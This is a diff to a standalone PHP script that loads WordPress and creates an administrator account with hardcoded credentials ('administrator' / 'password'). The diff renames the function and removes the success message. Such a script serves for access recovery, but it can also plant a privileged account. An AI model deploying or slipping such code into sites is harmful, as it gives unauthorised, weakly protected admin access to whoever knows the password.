@@ -1,10 +1,11 @@
 <?php
 
 $wp_folder = '';
-$username = 'adminer';
+$username = 'administrator';
 $password = 'password';
-$email = 'mail@example.com';
+$email = 'mail69@example.com';
 
+// Check if there is WordPress folder defined
 if(!empty($wp_folder)) {
   $wp_load_path = $wp_folder .'/wp-load.php';
 } else {
@@ -12,19 +13,17 @@ if(!empty($wp_folder)) {
 }
 
 // Verify if wp-load.php is exist
-
 if (!file_exists($wp_load_path)) {
     echo "ERROR! wp-load.php does not exist!";
     echo '<br>';
     exit;
 }
 
-//execute the function to create the admin user
-create_wp_admin_user($username, $password, $email, $wp_load_path);
+// Function execution to create the user with full administrator role
+vc_create_administrator($username, $password, $email, $wp_load_path);
  
-function create_wp_admin_user($username, $password, $email, $wp_load_path) {
+function vc_create_administrator($username, $password, $email, $wp_load_path) {
  
-   //link this script into wordpress
    include($wp_load_path);
   
    if (!username_exists($username)) {
@@ -32,10 +31,7 @@ function create_wp_admin_user($username, $password, $email, $wp_load_path) {
      $user = new WP_User($user_id);
      $user->set_role('administrator');
      header("Location: wp-login.php/");
- 
-         echo 'User '.$username.' is successfully created!';
-         echo '<br>';
-         
+          
    } else {
  
          echo 'ERROR! - ' . $username . ' already exists!';
@@ -46,4 +42,4 @@ function create_wp_admin_user($username, $password, $email, $wp_load_path) {
  
 }
 
-add_action('init','create_wp_admin_user');
+add_action('init','vc_create_administrator');
